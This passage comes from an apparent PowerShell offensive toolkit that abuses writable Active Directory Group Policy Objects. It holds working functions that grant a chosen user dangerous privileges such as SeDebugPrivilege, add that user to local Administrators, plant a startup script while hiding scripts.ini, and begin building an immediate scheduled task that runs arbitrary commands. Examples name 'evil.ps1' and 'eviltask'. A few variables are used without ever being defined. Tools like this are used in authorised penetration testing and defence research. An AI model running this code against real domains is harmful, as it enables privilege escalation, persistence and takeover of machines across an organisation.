                    $Path = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath
                } else {
    
                    if ($Path.Substring($Path.Length - 1) -eq "\") {
                            
                        $Path = $Path.Substring(0, $Path.Length - 2)
                    }
                }
            }
        }
    }
        
    PROCESS {

        $guidSplited = $ActualGuids.Split("[")
        $finalHashTable = @{}
    
        foreach ($psObject in $CSEGuids) {
    
            if (-not $guidSplited.Contains($psObject.CSEPrincipal)) {
            
                $guidSplited += -join @($psObject.CSEPrincipal, (-join $psObject.CSETool), "]")
            }
        }
    
        foreach ($guidList in $guidSplited) {
    
            if ($guidList -ne "" -and $null -ne $guidList) {
        
                $currentCSEPrincipal,[String[]]$currentCSETool = $guidList.Replace("}{", " ").Replace("{", "").Replace("}]", "").Split(" ")
                    
                foreach ($psObject in $CSEGuids) {
            
                    if ($currentCSEPrincipal -eq $psObject.CSEPrincipal.Replace("{","").Replace("}","")) {
            
                        foreach ($CSETool in $psObject.CSETool) {
            
                            if (-not $currentCSETool.Contains($CSETool.Replace("{","").Replace("}", ""))) {
            
                                $currentCSETool += $CSETool.Replace("{", "").Replace("}", "")
                            }
                        }
                    }
            
                    $sortedClient = $currentCSETool | Sort-Object
            
                    $finalSorted = @()
            
                    foreach ($guid in $sortedClient) {
            
                        $finalSorted += -join @("{", $guid, "}")
                    }
                }
            
                try {
            
                    $finalHashTable += @{(-join @("{",$currentCSEPrincipal,"}")) = (-join $finalSorted)}
            
                } catch {
            
                    if (-not $finalHashTable[(-join @("{",$currentCSEPrincipal,"}"))].Contains((-join $finalSorted))) {
            
                        $finalHashTable[(-join @("{",$currentCSEPrincipal,"}"))] = (-join $finalSorted)
                    }
                }
            }
        }
            
        $orderedCSEPrincipal = $finalHashTable.Keys | Sort-Object
        $final = ""
        foreach ($guid in $orderedCSEPrincipal) {
                
            $final += -join @("[", $guid, $finalHashTable[$guid], "]")
        }

        Write-Verbose "[Update-GPO] changing LDAP properties"
    
        $returnValue = Set-DomainObjectProperty -SET @{ $property = $final; "versionNumber" = $futureVersionNumber} -OverWrite -InputObject $RawGpoObject
    
        if ($returnValue) {
    
            if (-not $Path.Contains("GPT.ini")) {$Path += "\GPT.ini"}
    
            if (-not (Test-Path -Path $Path)) {
        
                Write-Warning "[Update-GPO] Could not find GPT.ini"
            }
    
            Write-Verbose "[Update-GPO] Updating GPT.ini"
    
            $content = Get-Content -Path $Path
            $new_content = ""
            foreach ($line in $content) {
        
                if ($line.Contains("Version=")) {
        
                    $line = $line -split "="
                    $line[1] = $futureVersionNumber.ToString()
                    $line = -join @($line[0],"=",$line[1])
                }
                $new_content = -join @($new_content, "$line $([System.Environment]::NewLine)")
            }
            Set-Content -Value $new_content -Path $Path
        } 
    }
        
    END {

        return $returnValue
    }
}

function New-CSEValues {
    
<#
    
    .SYNOPSIS
    
        Return formated guid for Update-GPO.
    
    .DESCRIPTION
    
        From a hashtable it creates a list of PSCustomObject with 2 properties CSEGuid and CSETool.
    
    .PARAMETER CSEPrincipal
    
        GPO CSE guid for defining parameters that set the GPO.

    .PARAMETER CSETool

        Associated tool for CSEPrincipal.
    
    .PARAMETER RawInput
    
        Input a hashtable with format @{CSEGuid = CSETool}.
    
    .PARAMETER AddRights
    
        Return associated CSE Guids for AddRights exploitation.
    
    .PARAMETER AddUser
    
        Return associated CSE Guids for AddUser exploitation.
    
    .PARAMETER StartupScript
    
        Return associated CSE Guids for StartupScript exploitation.
    
    .PARAMETER ImmediateTask
    
        Return associated CSE Guids for ImmediateTask exploitation.
    
    .EXAMPLE
    
        New-CSEValues -AddRights
    
    .EXAMPLE
    
        New-CSEValues -CSEPrincipal"{827D319E-6EAC-11D2-A4EA-00C04F79F83A}" -CSETool "{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}"
    
    .EXAMPLE
    
        New-CSEValues -RawInput @{"{827D319E-6EAC-11D2-A4EA-00C04F79F83A}" = "{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}"}
    
    .NOTES
    
        See [MS-GPOL] for more informations about it.
    
    .LINK 
    
        https://docs.microsoft.com/fr-fr/archive/blogs/mempson/group-policy-client-side-extension-list
    
#>
    
    [OutputType([System.Object[]], [System.Management.Automation.PSCustomObject])]
    [CmdletBinding()]
    
    param (
    
        [Parameter(ParameterSetName="Custom", Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CSEPrincipal,

        [Parameter(ParameterSetName="Custom", Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $CSETool,
    
        [Parameter(ParameterSetName="Custom", Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [hashtable]
        $RawInput,
    
        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$false)]
        [Switch]
        $AddRights,
    
        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$false)]
        [Switch]
        $AddUser,
    
        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$false)]
        [Switch]
        $StartupScript,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$false)]
        [Switch]
        $RegistryPref,
    
        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$false)]
        [Switch]
        $ImmediateTask
    )
    
    BEGIN {
    
        $GuidPSObjectList = @()
    }
    
    PROCESS {
    
        if ($AddRights.IsPresent) {
    
            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"; "CSETool" = @("{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}")}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject
        }
    
        if ($AddUser.IsPresent) {
                
            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"; "CSETool" = @("{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}")}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject
        }
    
        if ($StartupScript.IsPresent) {
                
            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = "{42B5FAAE-6536-11D2-AE5A-0000F87571E3}"; "CSETool" = @("{40B6664F-4972-11D1-A7CA-0000F87571E3}")}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject
        }
    
        if ($ImmediateTask.IsPresent) {
    
            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = "{00000000-0000-0000-0000-000000000000}"; "CSETool" = @("{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}")}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject

            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = "{AADCED64-746C-4633-A97C-D61349046527}"; "CSETool" = @("{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}")}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject
        }

        if ($RegistryPref.IsPresent) {

            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = "{B087BE9D-ED37-454F-AF9C-04291E351182}"; "CSETool" = @("{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}")}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject
        }
    
        if ($CSEGuid) {
    
            $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = $CSEGuid; "CSETool" = $PSBoundParameters.CSETool}
            $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
            $GuidPSObjectList += $CustomObject
        }
    
        if ($RawInput) {
    
            foreach ($CSEGuid in $RawInput.Keys) {
    
                $CustomObject = New-Object System.Management.Automation.PSObject -Property @{"CSEPrincipal" = $CSEGuid; "CSETool" = $RawInput[$CSEGuid]}
                $CustomObject.PSObject.TypeNames.Insert(0, "PowerGPOAbuse.CSEValues")
                $GuidPSObjectList += $CustomObject
            }
        }
    }
    
    END {
    
        return $GuidPSObjectList
    }
}

function Add-GPOUserRights {

<#

    .SYNOPSIS

        Add rights to a user account.

    .DESCRIPTION

        Add a specified right assignment to a specified user account.

    .PARAMETER Rights

        Set the new rights to add to a user. Comma separated list must be used.

    .PARAMETER UserIdentity

        Set the samaccountname/SID/disguishedname/LDAP Path to add the new rights.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-GPOUserRights -Rights "SeLoadDriverPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-GPOUserRights -Rights "SeLoadDriverPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-GPOUserRights -Rights "SeLoadDriverPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-GPOUserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-GPOUserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-GPOUserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]
    
    param (

        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateSet("SeTrustedCredManAccessPrivilege","SeNetworkLogonRight","SeTcbPrivilege","SeMachineAccountPrivilege","SeIncreaseQuotaPrivilege","SeInteractiveLogonRight","SeRemoteInteractiveLogonRight","SeBackupPrivilege","SeChangeNotifyPrivilege","SeSystemtimePrivilege","SeTimeZonePrivilege","SeCreatePagefilePrivilege","SeCreateTokenPrivilege","SeCreateGlobalPrivilege","SeCreatePermanentPrivilege","SeCreateSymbolicLinkPrivilege","SeDebugPrivilege","SeDenyNetworkLogonRight","SeDenyBatchLogonRight","SeDenyServiceLogonRight","SeDenyInteractiveLogonRight","SeDenyRemoteInteractiveLogonRight","SeEnableDelegationPrivilege","SeRemoteShutdownPrivilege","SeAuditPrivilege","SeImpersonatePrivilege","SeIncreaseWorkingSetPrivilege","SeIncreaseBasePriorityPrivilege","SeLoadDriverPrivilege","SeLockMemoryPrivilege","SeBatchLogonRight","SeServiceLogonRight","SeSecurityPrivilege","SeRelabelPrivilege","SeSystemEnvironmentPrivilege","SeManageVolumePrivilege","SeProfileSingleProcessPrivilege","SeSystemProfilePrivilege","SeUndockPrivilege","SeAssignPrimaryTokenPrivilege","SeRestorePrivilege","SeShutdownPrivilege","SeSyncAgentPrivilege","SeTakeOwnershipPrivilege")]
        [ValidateCount(1,10)]
        [String[]]
        $Rights,

        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity", "PrincipalIdentity")]
        [String]
        $UserIdentity,

        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("TargetIdentity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$false)]
        [Switch]
        $Force,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $RawGpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity -Raw
        $GpoObject = $RawGpoObject.Properties
        $UserSid = (Get-DomainUser @arguments -UserIdentity $UserIdentity).objectsid

        $share = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath

        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, "\GPT.ini")
    }

    PROCESS {

        $text = @'
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision = 1
[Privilege Rights]
'@
        foreach ($right in $Rights) {
            
            $tempLine = -join @([System.Environment]::NewLine, "$right = *$UserSid")
            $text += $tempLine
        }

        if (Test-Path -Path $GPOInipath ) {
        
            $path = -join @($GPOpath, '\Machine\Microsoft\Windows NT\SecEdit\')
        } else {
            
            Write-Verbose "[Add-GPOUserRights] Could not find the specified GPO"
            return
        }
            
        if (-not (Test-Path -Path $path )) {
            
            $null = New-Item -Path $path -ItemType Directory
        }

        $path += 'GptTmpl.inf'
        if (Test-Path -Path $path) {
            
            $exists = $false
            $content = Get-Content -Path $path

            foreach ($line in $content) {

                if ($line.Contains('[Privilege Rights]')) {

                    $exists = $true
                }
            }

            if ($exists) {

                Write-Verbose "[Add-GPOUserRights] The GPO already specifies user rights"
                return
            } else {

                $stringContent = $content | Out-String
                $stringContent = -join @($stringContent, $right_line)
                Set-Content -Path $path -Value $stringContent

                Update-GPO @arguments -InputObject $RawGpoObject -CSE (New-CSEValues -AddRights) -GPOType Computer -Path $GPOInipath
            }
        } else {

            Write-Verbose "[Add-GPOUserRights] Creating file $path"
            $null = New-Item -Path $path -ItemType File -Force
            Set-Content -Path $path -Value $text 

            $returnValue = Update-GPO @arguments -InputObject $RawGpoObject -CSE (New-CSEValues -AddRights) -GPOType Computer -Path $GPOInipath
        }
        Write-Verbose "[Add-GPOUserRights] The GPO was modified to assign new rights to target user. Wait for the GPO refresh cycle"
    }

    END {

        Mount-SmbShare -Remove $share
        return $returnValue
    }
}

function Add-GPOGroupMember {

<#

    .SYNOPSIS

        Add a new local admin. This will replace any existing member of the group !

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Member

        Set the samaccountname/SID/disguishedname/LDAP Path of the account to be added in local admins.

    .PARAMETER BuiltinGroup

        Local builtin group to modify?

    .PARAMETER DomainGroup

        EXPERIMENTAL, add the user to a domain group, works only if a DC is touched by a GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER Force

        Overwrite existing files if required.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-GPOGroupMember -Member 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-GPOGroupMember -Member 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-GPOGroupMember -Member 'Bobby' -GPOIdentity 'SuperSecureGPO'

#>  
    
    [OutputType([System.Boolean])]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("TargetIdentity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("PrincipalIdentity", "Identity", "UserIdentity")]
        [String]
        $Member,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateSet("Administrators", "AccountOperators", "ServerOperators", "BackupOperators")]
        [String]
        $BuiltinGroup = "Administrators",

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainGroup,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$false)]
        [Switch]
        $Force,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=8, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {

        $BuiltinSid = @{"Administrators" = "S-1-5-32-544"; "AccountOperators" = "S-1-5-32-548"; "ServerOperators" = "S-1-5-32-549"; "BackupOperators" = "S-1-5-32-551"}

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        if ($DomainGroup) {

            $groupSid = (Get-DomainGroup @arguments -GroupIdentity $DomainGroup).objectsid
        } else {

            $groupSid = $BuiltinSid[$BuiltinGroup]
        }

        $RawGpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity -Raw
        $GpoObject = $RawGpoObject.properties
        $UserSid = (Get-DomainUser @arguments -UserIdentity $Member).objectsid

        $share = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath

        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, "\GPT.ini")
    }

    PROCESS {

        $start = @'
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$
Revision=1
'@
        $text = @("[Group Membership]", (-join @("*", $groupSid,"__Memberof =")), (-join @("*", $groupSid,"__Members = *", $UserSid) ))

        if (Test-Path -Path $GPOInipath ) {
        
            $path = -join @($GPOpath, '\Machine\Microsoft\Windows NT\SecEdit\')
        } else {
            
            Write-Verbose "[Add-GPOGroupMember] Could not find the specified GPO"
            return $false
        }
            
        if (-not (Test-Path -Path $path )) {
            
            $null = New-Item -ItemType Directory -Path $path
        }
        $path = -join @($path, 'GptTmpl.inf')
        if (Test-Path -Path $path ) {
            
            $exists = $false
            $content = Get-Content -Path $path 

            foreach ($line in $content) {

                if ($line -match '[Group Membership]') {

                    $exists = $true
                }
            }

            if ($exists -and (-not $Force)) {

                Write-Verbose "[Add-GPOGroupMember] Group Memberships are already defined in the GPO. Use -Force to make changes"
                return $false
            } elseif ($exists -and $Force) {
                    
                foreach ($line in $content) {

                    if (($line.Replace(" ", "").Contains('*' + $groupSid + '__Members='))) {
    
                        if (($line.Replace(" ", "").Contains('*' + $groupSid +'__Members=')) -and (-not ($line.Replace(" ", "").Equals('*' + $groupSid + '__Members=')))) {

                            $content[$content.IndexOf($line)] = -join @($line, ", *", $UserSid)
                        } elseif (($line.Replace(" ", "").Contains('*' + $groupSid +'__Members=')) -and (($line.Replace(" ", "").Equals('*' + $groupSid +'__Members=')))) {
                                
                            $content[$content.IndexOf($line)] = -join @($line, " *", $UserSid)
                        } 
                    } else {

                        continue
                    }
                }

                Set-Content -Path $path -Value $content
                $returnValue = Update-GPO -InputObject $RawGpoObject @arguments -Path $GPOInipath -GPOType "Computer" -CSE (New-CSEValues -AddUser)           
            } else {

                return 
            }
        } else {

            Write-Verbose "[Add-GPOGroupMember] Creating file $path"
            $null = New-Item -Path $path -ItemType File -Force
            $new_text = -join $start,$text
            Set-Content -Path $path -Value $new_text
            $returnValue = Update-GPO -InputObject $RawGpoObject @arguments -Path $GPOInipath -GPOType "Computer" -CSE (New-CSEValues -AddUser)
        }
        Write-Verbose "[Add-GPOGroupMember] The GPO was modified to include a new User in $groupSid. Wait for the GPO refresh cycle"
    }

    END {

        Mount-SmbShare -Remove $share
        return $returnValue
    }
}

function Add-GPOStartupScript {

<#

    .SYNOPSIS

        Add a new startup script.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER ScriptName

        Set the name of the new startup script.

    .PARAMETER ScriptContent

        Set the contents of the new startup script.

    .PARAMETER Scope

        Computer or user startup script.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-GPOStartupScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Scope Computer -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-GPOStartupScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Scope Computer -Domain 'contoso.com'

    .EXAMPLE

        Add-GPOStartupScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Scope Computer

#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity", "TargetIdentity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$false, Position=1,ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ScriptName = ((-join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})) + ".ps1"),

        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ScriptContent,

        [Parameter(Mandatory=$true, Position=3, ValueFromPipeline=$true)]
        [ValidateSet("Computer", "User")]
        [String]
        $Scope,
        
        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$false)]
        [Switch]
        $Force,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $RawGpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity -Raw
        $GpoObject = $RawGpoObject.Properties
        $share = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath

        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, "\GPT.ini")
    }

    PROCESS {

        $Hidden_ini = @"
[Startup]
0cmdline=$ScriptName
0parameter=
"@

        if (Test-Path -Path $GPOPath) {

            $path = -join @($GPOPath, "\$(if ($Scope -eq "Computer") {"Machine"} else {$Scope})\Scripts\$(if ($Scope -eq "Computer") {"Startup"} else {"Logon"})\")
            $Hidden_path = -join @($GPOPath, "\$(if ($Scope -eq "Computer") {"Machine"} else {$Scope})\Scripts\scripts.ini")
        } else {

            Write-Verbose "[Add-GPOStartupScript] Could not find the specified GPO!"
            return
        }
    
        if (-not (Test-Path -Path $path)) {
    
            $null = New-Item -ItemType Directory -Path $path
        }
        $path = -join @($path, $ScriptName)
        if (Test-Path -Path $path) {
    
            Write-Verbose "[Add-GPOStartupScript] A Startup script with the same name already exists. Choose a different name"
            return
        } else {

            Write-Verbose "[Add-GPOStartupScript] Creating new startup script"
            $null = New-Item -Path $path -ItemType File -Force
            Set-Content -Path $path -Value $ScriptContent
        }
    
        if (Test-Path -Path $Hidden_path) {
    
            Set-ItemProperty -Path $Hidden_path -Name "attributes" -Value ((Get-ItemProperty -Path $Hidden_path -Name "attributes").attributes -bxor "Hidden")
    
            $line = ""
            $new_list = @()
            $content = Get-Content -Path $Hidden_path
            foreach ($line in $content) {
                    
                $new_list.Add($line)
            }

            $first_element = @()
            $q = ""
            foreach ($item in $new_list) {
                    
                try {
                        
                    $q = ($item[0].ToString()) -replace "[^0-9]", ""
                    $first_element.Add([System.Int32]$q)
                }
                catch {
                        
                    continue
                }
            }

            $max = [System.String](($first_element | Measure-Object -Maximum).Maximum + 1)
            $Hidden_ini = @"
$(-join @($max, "Cmdline"))=$ScriptName
$(-join @($max, "Parameter"))=
"@
            $new_list.Add($toAdd)
            $string_to_add = ""
            foreach ($string in $new_list) {

                $string_to_add = -join @($string_to_add, "$string $([System.Environment]::NewLine)")
            }
            Set-Content -Path $Hidden_path -Value $string_to_add 
            Set-ItemProperty -Path $Hidden_path -Name "attributes" -Value ((Get-ItemProperty -Path $Hidden_path -Name "attributes").attributes -bxor "Hidden")

        } else {

            $null = New-Item -ItemType File -Path $Hidden_path
            Set-Content -Path $Hidden_path -Value $Hidden_ini
            Set-ItemProperty -Path $Hidden_path -Name "attributes" -Value ((Get-ItemProperty -Path $Hidden_path -Name "attributes").attributes -bxor "Hidden")
        }

        $returnValue = Update-GPO @arguments -InputObject $RawGpoObject -Path $GPOInipath -GPOType $Scope -CSE (New-CSEValues -StartupScript)
        Write-Verbose "[Add-GPOStartupScript] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle"
    }

    END {

        Mount-SmbShare -Remove $share
        return $returnValue
    }
}


function Add-GPOImmediateTask {

<#

    .SYNOPSIS

        Add a new computer immediate task.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER TaskName

        Set the name of the new task.

    .PARAMETER Author

        Set the author of the new task (use a DA account).

    .PARAMETER Command

        Command to execute.

    .PARAMETER CommandArguments

        Arguments passed to the command.
    
    .PARAMETER Scope

        Computer or user startup script.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER Force

        Overwrite existing files if required.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Domain 'contoso.com' -Scope Computer -Credential $cred

    .EXAMPLE

        Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Domain 'contoso.com' -Scope Computer

    .EXAMPLE

        Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer

#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]
    
    param (

        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity", "TargetIdentity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TaskName = (-join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})),

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Author = -join @($env:USERDNSDOMAIN, "\", $env:USERNAME),

        [Parameter(Mandatory=$true, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Parameter(Mandatory=$true, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Arguments")]
        [String]
        $CommandArguments,

        [Parameter(Mandatory=$true, Position=5, ValueFromPipeline=$true)]
        [ValidateSet("Computer", "User")]
        [String]
        $Scope,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$false)]
        [Switch]
        $Force,

        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=8, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=9, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

